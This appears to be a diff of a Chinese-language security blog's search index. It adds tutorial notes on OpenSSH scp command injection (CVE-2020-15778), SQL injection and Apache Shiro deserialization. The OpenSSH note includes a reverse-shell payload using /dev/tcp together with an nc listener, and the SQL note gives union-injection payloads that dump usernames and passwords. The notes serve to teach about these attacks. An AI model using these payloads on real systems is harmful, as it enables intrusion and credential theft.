@@ -1,6 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
+    <url>//925033d13d8a.html</url>
+    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
+<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+</ul>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
+<li>知道SSH密码</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;pwd&#96; &#x2F;home&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.1&#x2F;8432 0&gt;&amp;1&#96; &#x2F;home&#x2F;test.txt&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
+<p>使用rsync代替scp</p>
+<p>官方暂无补丁</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>命令注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3-argparse</title>
     <url>//560821a385be.html</url>
     <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
@@ -28,6 +66,163 @@
       </categories>
       <tags>
         <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>//9958bd672d7e.html</url>
+    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
+<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
+<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39; or 1 &#x3D; 1 --+</span><br></pre></td></tr></table></figure>
+
+<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
+<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
+<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
+<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
+<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
+<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
+<p><strong>在MySQL5.0以下</strong>，没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+<p><strong>在MySQL5.0以上</strong>，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<p><strong>information_schema数据库中三个很重要的表：</strong></p>
+<p><strong>information_schema.schemata</strong>:  该数据表存储了mysql数据库中的所有数据库的库名<br><strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名<br><strong>information_schema.columns</strong>:    该数据表存储了mysql数据库中的所有列的列名</p>
+<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
+<li>database()：当前数据库</li>
+<li>user()：查询数据库的用户</li>
+<li>version()：查询数据库版本</li>
+<li>system_user()：系统用户名</li>
+<li>session_user()：链接数据库的用户名</li>
+<li>current_user：当前用户名</li>
+<li>load_file()：读取本地文件</li>
+<li>@@datadir：读取数据库路径</li>
+<li>@@basedir：MySQL安装路径</li>
+<li>@@version_complie_os：查看操作系统</li>
+</ul>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
+<ul>
+<li>数字类型的注入</li>
+<li>字符类型的注入</li>
+<li>搜索类型的注入</li>
+</ul>
+<p><strong>依据提交方式分类</strong></p>
+<ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>COOKIE注入</li>
+<li>HTTP头注入（XFF注入、UA注入、REFERER注入）</li>
+</ul>
+<p><strong>依据获取信息的方式分类</strong></p>
+<ul>
+<li>基于布尔的盲注</li>
+<li>基于时间的盲注</li>
+<li>基于报错的盲注</li>
+<li>联合查询注入</li>
+<li>堆查询注入（可同时执行多条语句）</li>
+</ul>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><table>
+<thead>
+<tr>
+<th align="center">数据库</th>
+<th align="center">指纹</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL</td>
+<td align="center"><strong>information_schema.tables</strong></td>
+</tr>
+<tr>
+<td align="center">Access</td>
+<td align="center">msysobjects</td>
+</tr>
+<tr>
+<td align="center">SQL server</td>
+<td align="center">sysobjects</td>
+</tr>
+<tr>
+<td align="center">Oracle</td>
+<td align="center">dual</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;判断MySQL数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from information_schema.tables) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Access数据库 </span><br><span class="line">xxx?id&#x3D;1 and exists(select * from msysobjects) --+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断Mssql数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from sysobjects) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Oracle数据库</span><br><span class="line">xxx?id&#x3D;1 and (select count(*) from dual)&gt;0 --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Union联合查询注入"><a href="#Union联合查询注入" class="headerlink" title="Union联合查询注入"></a>Union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
+<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1 and 1 &#x3D; 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1’ and 1 &#x3D; 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; 1&#39; order by 5 --+</span><br></pre></td></tr></table></figure>
+
+<p>通过语句<code>order by x</code>来判断字段的数量</p>
+<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
+<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>
+
+<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
+<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
+<p>后面的数值排列取决于判断的字段数量</p>
+<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
+<p>如图下的2和3可能会在网页中显现出来</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
+<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
+<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
+<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
+<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
+<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
+<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
+<h3 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D; databese() and table_name &#x3D; &#39;user&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
+<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
+<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>
+
+<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
+<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
+<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
+<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
+<h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><p>盲注，通常是在服务器没有回显错误信息，所以攻击者找到验证注入的SQL语句是否执行的方法</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>注入类漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shiro反序列化</title>
+    <url>//50f501257ce7.html</url>
+    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多</p>
+<h2 id="shiro反序列化导致命令执行（shiro-550-CVE-2016-4437）"><a href="#shiro反序列化导致命令执行（shiro-550-CVE-2016-4437）" class="headerlink" title="shiro反序列化导致命令执行（shiro-550 CVE-2016-4437）"></a>shiro反序列化导致命令执行（shiro-550 CVE-2016-4437）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：<br>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）<br>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
+<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>Shrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe的内容。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>Apache Shiro &lt; 1.2.4</li>
+</ul>
+<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>  只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用技巧：<br>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
+<h2 id="Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）"></a>Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>  Shiro实用AES-CBC模式进行加解密，存在Padding Oracle Attack漏洞，已登录的攻击者同样可进行反序列化操作。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>Apache Shiro &lt; 1.4.2</li>
+</ul>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用技巧：<br>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
+]]></content>
+      <tags>
+        <tag></tag>
       </tags>
   </entry>
   <entry>
@@ -115,97 +310,6 @@
       </categories>
       <tags>
         <tag>Python库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞</title>
-    <url>//9958bd672d7e.html</url>
-    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
-<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure>
-
-<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
-<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39; or 1 &#x3D; 1 --+</span><br></pre></td></tr></table></figure>
-
-<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
-<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
-<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
-<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
-<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
-<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
-<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<h2 id="MYSQL-union联合查询注入"><a href="#MYSQL-union联合查询注入" class="headerlink" title="MYSQL union联合查询注入"></a>MYSQL union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
-<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1 and 1 &#x3D; 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1’ and 1 &#x3D; 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; 1&#39; order by 5 --+</span><br></pre></td></tr></table></figure>
-
-<p>通过语句<code>order by x</code>来判断字段的数量</p>
-<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
-<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>
-
-<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
-<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
-<p>后面的数值排列取决于判断的字段数量</p>
-<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
-<p>如图下的2和3可能会在网页中显现出来</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
-<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
-
-<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
-<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
-<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
-<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
-<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
-<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
-<h2 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D; databese() and table_name &#x3D; &#39;user&#39; --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
-<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
-<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
-<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
-<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
-<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>注入类漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shiro反序列化</title>
-    <url>//50f501257ce7.html</url>
-    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多</p>
-<h2 id="shiro反序列化导致命令执行（shiro-550-CVE-2016-4437）"><a href="#shiro反序列化导致命令执行（shiro-550-CVE-2016-4437）" class="headerlink" title="shiro反序列化导致命令执行（shiro-550 CVE-2016-4437）"></a>shiro反序列化导致命令执行（shiro-550 CVE-2016-4437）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：<br>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）<br>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
-<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>Shrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe的内容。</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
-<li>Apache Shiro &lt; 1.2.4</li>
-</ul>
-<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>  只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用技巧：<br>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
-<h2 id="Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）"></a>Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>  Shiro实用AES-CBC模式进行加解密，存在Padding Oracle Attack漏洞，已登录的攻击者同样可进行反序列化操作。</p>
-<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
-<li>Apache Shiro &lt; 1.4.2</li>
-</ul>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用技巧：<br>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
-]]></content>
-      <tags>
-        <tag></tag>
       </tags>
   </entry>
   <entry>
@@ -308,52 +412,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> run,data</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data[<span class="number">0</span>]=<span class="number">5</span> <span class="comment">#类似赋值，b里面的data和a里面的data指向同一个对象，这么做对两者都有影响</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出[5,2,3] </span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">data=<span class="number">100</span> <span class="comment">#由于直接改变了data的指向，所以不会影响源模块a</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出100</span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python3基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3数组</title>
-    <url>//dff4ce1f2267.html</url>
-    <content><![CDATA[<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
